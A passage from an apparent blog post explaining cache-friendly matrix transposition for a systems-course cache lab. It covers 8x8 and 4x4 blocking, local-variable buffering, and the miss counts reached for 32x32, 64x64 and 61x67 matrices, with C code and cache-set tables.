d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1528,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1806,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2084,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2584,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span>. What if we do not need to update
the cache? In other words, the cache always stores data from matrix
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span>. To this end, we can make use of
local variables to store one block of integers from matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>. Tne cache will only get updated when
we first load data into local variables. Later, the cache will be
overwritten by matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span> and will
keep as it is.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], B[M][N])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">if</span> (M == <span class="number">32</span> &amp;&amp; N == <span class="number">32</span>)</span><br><span class="line">  {</span><br><span class="line">      <span class="type">int</span> i, j, block_i, block_j;</span><br><span class="line">      <span class="type">int</span> Temp[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>)</span><br><span class="line">          <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>)</span><br><span class="line">              <span class="keyword">for</span> (block_i = i; block_i &lt; i + <span class="number">8</span>; ++block_i) {</span><br><span class="line">                  <span class="comment">// Load current block of A into local variables</span></span><br><span class="line">                  <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                      Temp[block_j - j] = A[block_i][block_j];</span><br><span class="line">                  }</span><br><span class="line">                  <span class="comment">// Write from locals into B</span></span><br><span class="line">                  <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                      B[block_j][block_i] = Temp[block_j - j];</span><br><span class="line">                  }</span><br><span class="line">              }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (M == <span class="number">64</span> &amp;&amp; N == <span class="number">64</span>) </span><br><span class="line">  {</span><br><span class="line">    </span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>This time we get 290 misses! Full score!</p>
<p>The key idea here is to improve temporal locality as much as
possible. To improve temporal locality, we need to try to visit data
within a cache block within as much as we can. Blocking helps with this.
On the other side, we must reduce the number of times of cache
overwriting. Local variables help with this.</p>
<p>Unfortunately, when we have <code>M=N=64</code> using the same code,
the number of cache misses is... <strong>4614</strong>. What the f is
going on? Well, let's revist the cache layout pattern for a
<code>64*64</code> matrix.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> ---------------------------------------</span><br><span class="line">| 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | row 1</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 8  | 9  | 10 | 11 | 12 | 13 | 14 | 15 | row 2</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 16 | 17 | 18 | 19 | 20 | 21 | 22 | 23 | row 3</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 24 | 25 | 26 | 27 | 28 | 29 | 30 | 31 | row 4</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | row 5</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 8  | 9  | 10 | 11 | 12 | 13 | 14 | 15 | row 6</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 16 | 17 | 18 | 19 | 20 | 21 | 22 | 23 | row 7</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 24 | 25 | 26 | 27 | 28 | 29 | 30 | 31 | row 8</span><br><span class="line"> ---------------------------------------</span><br><span class="line"> .......................................</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | row 61</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 8  | 9  | 10 | 11 | 12 | 13 | 14 | 15 | row 62</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 16 | 17 | 18 | 19 | 20 | 21 | 22 | 23 | row 63</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 24 | 25 | 26 | 27 | 28 | 29 | 30 | 31 | row 64</span><br><span class="line"> ---------------------------------------</span><br></pre></td></tr></table></figure>
<p>The diagram shows that <code>8*8</code> blocking only leverages 4
distinct caches and repeats every 4 rows. Let's see how it works when we
use <code>8*8</code> blocking.</p>
<table>
<colgroup>
<col style="width: 17%">
<col style="width: 17%">
<col style="width: 17%">
<col style="width: 14%">
<col style="width: 17%">
<col style="width: 17%">
</colgroup>
<thead>
<tr>
<th>A Read</th>
<th>Cache Set</th>
<th>Miss or Hit</th>
<th>B Write</th>
<th>Cache Set</th>
<th>Miss or Hit</th>
</tr>
</thead>
<tbody>
<tr>
<td>A[0][0]</td>
<td>0</td>
<td>M</td>
<td>B[0][0]</td>
<td>0</td>
<td>M</td>
</tr>
<tr>
<td>A[0][1]</td>
<td>0</td>
<td>M</td>
<td>B[1][0]</td>
<td>8</td>
<td>M</td>
</tr>
<tr>
<td>A[0][2]</td>
<td>0</td>
<td>H</td>
<td>B[2][0]</td>
<td>16</td>
<td>M</td>
</tr>
<tr>
<td>A[0][3]</td>
<td>0</td>
<td>H</td>
<td>B[3][0]</td>
<td>24</td>
<td>M</td>
</tr>
<tr>
<td>A[0][4]</td>
<td>0</td>
<td>H</td>
<td>B[4][0]</td>
<td>0</td>
<td>M</td>
</tr>
<tr>
<td>A[0][5]</td>
<td>0</td>
<td>M</td>
<td>B[5][0]</td>
<td>8</td>
<td>M</td>
</tr>
<tr>
<td>A[0][6]</td>
<td>0</td>
<td>H</td>
<td>B[6][0]</td>
<td>16</td>
<td>M</td>
</tr>
<tr>
<td>A[0][7]</td>
<td>0</td>
<td>H</td>
<td>B[7][0]</td>
<td>24</td>
<td>M</td>
</tr>
</tbody>
</table>
<p>Obviously the biggest problem is when we write the last 4 rows of
matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span>, we overwrite the
previously loaded blocks, i.e., row 0 to row 3. In this case, writes to
matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span> will have a miss rate of
100%.</p>
<p>What about using a <code>4*4</code> blocking strategy? Let's look at
it!</p>
<table>
<colgroup>
<col style="width: 17%">
<col style="width: 17%">
<col style="width: 17%">
<col style="width: 14%">
<col style="width: 17%">
<col style="width: 17%">
</colgroup>
<thead>
<tr>
<th>A Read</th>
<th>Cache Set</th>
<th>Miss or Hit</th>
<th>B Write</th>
<th>Cache Set</th>
<th>Miss or Hit</th>
</tr>
</thead>
<tbody>
<tr>
<td>A[0][0]</td>
<td>0</td>
<td>M</td>
<td>B[0][0]</td>
<td>0</td>
<td>M</td>
</tr>
<tr>
<td>A[0][1]</td>
<td>0</td>
<td>M</td>
<td>B[1][0]</td>
<td>8</td>
<td>M</td>
</tr>
<tr>
<td>A[0][2]</td>
<td>0</td>
<td>H</td>
<td>B[2][0]</td>
<td>16</td>
<td>M</td>
</tr>
<tr>
<td>A[0][3]</td>
<td>0</td>
<td>H</td>
<td>B[3][0]</td>
<td>24</td>
<td>M</td>
</tr>
<tr>
<td>A[1][0]</td>
<td>8</td>
<td>M</td>
<td>B[0][1]</td>
<td>0</td>
<td>M</td>
</tr>
<tr>
<td>A[1][1]</td>
<td>8</td>
<td>H</td>
<td>B[1][1]</td>
<td>8</td>
<td>M</td>
</tr>
<tr>
<td>A[1][2]</td>
<td>8</td>
<td>M</td>
<td>B[2][1]</td>
<td>16</td>
<td>H</td>
</tr>
<tr>
<td>A[1][3]</td>
<td>8</td>
<td>H</td>
<td>B[3][1]</td>
<td>24</td>
<td>H</td>
</tr>
<tr>
<td>A[2][0]</td>
<td>16</td>
<td>M</td>
<td>B[0][2]</td>
<td>0</td>
<td>H</td>
</tr>
<tr>
<td>A[2][1]</td>
<td>16</td>
<td>H</td>
<td>B[1][2]</td>
<td>8</td>
<td>M</td>
</tr>
<tr>
<td>A[2][2]</td>
<td>16</td>
<td>H</td>
<td>B[2][2]</td>
<td>16</td>
<td>M</td>
</tr>
<tr>
<td>A[2][3]</td>
<td>16</td>
<td>M</td>
<td>B[3][2]</td>
<td>24</td>
<td>H</td>
</tr>
<tr>
<td>A[3][0]</td>
<td>24</td>
<td>M</td>
<td>B[0][3]</td>
<td>0</td>
<td>H</td>
</tr>
<tr>
<td>A[3][1]</td>
<td>24</td>
<td>H</td>
<td>B[1][3]</td>
<td>8</td>
<td>H</td>
</tr>
<tr>
<td>A[3][2]</td>
<td>24</td>
<td>H</td>
<td>B[2][3]</td>
<td>16</td>
<td>M</td>
</tr>
<tr>
<td>A[3][3]</td>
<td>24</td>
<td>H</td>
<td>B[3][3]</td>
<td>24</td>
<td>M</td>
</tr>
</tbody>
</table>
<p>Awesome! We significantly improved the miss rate. However... the new
code produces caches misses 1702, which is still beyond our goal 1300.
This is because we're only using 4 integers per block, and results in a
50% waste of the block size. We'd like to combine reading 8 integers
each time and making full use of them to construct <code>4*4</code>
matrices.</p>
<p>In order to do this, we still load each 8 integers for each block
(i.e., each row of matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>) into
local variables. Then we only use 4 of each time, and store the rest 4
integers somewhere else. Where should we place the remaining 4 integers?
Recall the cache layout for a <code>64*64</code> matrix: if we divide
the <code>8*8</code> blocking into 4 sub-blocks, each of which is
<code>4*4</code>, we will be able to place the remaining four integers
in the adjacent sub-block, in the same order the first 4 integers are
written into <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span> to avoid cache
conflict.</p>
<p>Maybe it's bettet to take a look at the code below:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i, j, block_i, block_j;</span><br><span class="line"><span class="type">int</span> Temp[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j +=<span class="number">8</span>) {</span><br><span class="line">        <span class="comment">// 1. For first four rows of A</span></span><br><span class="line">        <span class="keyword">for</span> (block_i = i; block_i &lt; i + <span class="number">4</span>; ++block_i) {</span><br><span class="line">            <span class="comment">// 2. Load full cache block -- 8 integers into local vars</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                Temp[block_j - j] = A[block_i][block_j];</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// 3. Fill the top-left 4*4 sub-block</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">4</span>; ++block_j) {</span><br><span class="line">                B[block_j][block_i] = Temp[block_j - j];</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// 4. Store the rest four integers into the top-right 4*4 sub-block</span></span><br><span class="line">            <span class="comment">//    so that we avoid cache conflict</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">4</span>; ++block_j) {</span><br><span class="line">                B[block_j][block_i + <span class="number">4</span>] = Temp[block_j - j + <span class="number">4</span>];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// 5. For the remaining four rows of A</span></span><br><span class="line">        <span class="keyword">for</span> (block_i = i + <span class="number">4</span>; block_i &lt; i + <span class="number">8</span>; ++block_i) {</span><br><span class="line">            <span class="comment">// 6. Load from the top-right sub-block into local vars by row</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = i + <span class="number">4</span>; block_j &lt; i + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                Temp[block_j - i - <span class="number">4</span>] = B[j + block_i - i - <span class="number">4</span>][block_j];</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// 7. Fill the top-right sub-block by row</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = i + <span class="number">4</span>; block_j &lt; i + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                B[j + block_i - i - <span class="number">4</span>][block_j] = A[block_j][j + block_i - i - <span class="number">4</span>];</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// 8. Fill the bottom-left sub-block by row</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = i; block_j &lt; i + <span class="number">4</span>; ++block_j) {</span><br><span class="line">                B[j + block_i - i][block_j] = Temp[block_j - i];</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// 9. Fill the bottom-right sub-block by row</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = i + <span class="number">4</span>; block_j &lt; i + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                B[j + block_i - i][block_j] = A[block_j][j + block_i - i];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>
<p>We are always operating on a <code>4*4</code> sub-block each time
switching between matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span> and
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span>. By storing by row instead of by
column, we can minimize the number of conflict misses at each
iteration.</p>
<p>For the last problem, note that <code>61</code> and <code>67</code>
are both prime numbers, so the cache layout for this matrix is
irregular. For this reason, we simply adopt standard blocking. The
remaining question is, what's the blocking's size? Just fail and
try!</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i, j, block_i, block_j;</span><br><span class="line"><span class="type">int</span> Temp[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">56</span>; j += <span class="number">8</span>) {</span><br><span class="line">        <span class="keyword">for</span> (block_i = i; block_i &lt; i + <span class="number">16</span>; ++block_i) {</span><br><span class="line">            <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                Temp[block_j - j] = A[block_i][block_j];</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                B[block_j][block_i] = Temp[block_j - j];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">64</span>; i &lt; <span class="number">67</span>; ++i)</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">61</span>; ++j) {</span><br><span class="line">        B[j][i] = A[i][j];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i)</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">56</span>; j &lt; <span class="number">61</span>; ++j) {</span><br><span class="line">        B[j][i] = A[i][j];</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>
<p>We use <code>16*8</code> blocking and the miss count is 1907.</p>
<p>Let's go back to the question: where does the miss come from? The
answer is: conflict miss, the miss where the <strong>same</strong> cache
block is overwritten. To deal with this problem, we can either use
different cache blocks, or designing some mechanism to reduce the miss
count if it's not avoidable.</p>
